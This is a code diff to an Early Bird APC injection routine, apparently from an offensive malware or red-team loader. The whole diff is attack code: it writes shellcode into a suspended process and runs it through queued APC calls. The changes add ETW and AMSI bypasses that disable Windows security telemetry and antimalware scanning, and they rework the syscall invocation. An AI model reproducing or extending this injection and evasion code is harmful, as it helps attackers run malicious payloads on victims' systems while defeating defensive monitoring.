@@ -43,6 +43,18 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 	DebugPrint("[i] Suspended Process Created With Pid : %d \n", dwProcessId);
 	DebugPrint("[+] DONE \n\n");
 
+    //	apply ETW bypass
+    if (!applyEtwBypass(hProcess)) {
+        DebugPrint("[!] Failed To Apply ETW Bypass \n");
+        return FALSE;
+    }
+
+    //	apply AMSI bypass
+	if (!applyAmsiBypass(hProcess)) {
+		DebugPrint("[!] Failed To Apply AMSI Bypass \n");
+		CloseHandle(hThread);
+		return FALSE;
+	}
 
 // injecting the payload and getting the base address of it
 	DebugPrint("[i] Writing Shellcode To The Target Process ...\n");
@@ -52,9 +64,8 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 	DebugPrint("[+] DONE \n\n");
 
 //	running QueueUserAPC
-#ifdef HW_INDIRECT_SYSCALL
-    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
-    if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
+#ifdef SYSCALL_ENABLED
+    if ((STATUS = NtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
         DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
         return FALSE;
     }
@@ -64,11 +75,10 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 #endif
 
     DebugPrint("[i] Resuming The Suspended Thread ...\n");
-    NtResumeThread_t pNtResumeThread = (NtResumeThread_t)PrepareSyscall((char*)("NtResumeThread"));
     ULONG suspendCount = 0;
 
-#ifdef HW_INDIRECT_SYSCALL
-    if ((STATUS = pNtResumeThread(hThread, &suspendCount)) != 0) {
+#ifdef SYSCALL_ENABLED
+    if ((STATUS = NtResumeThread(hThread, &suspendCount)) != 0) {
         DebugPrint("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
         return FALSE;
     }
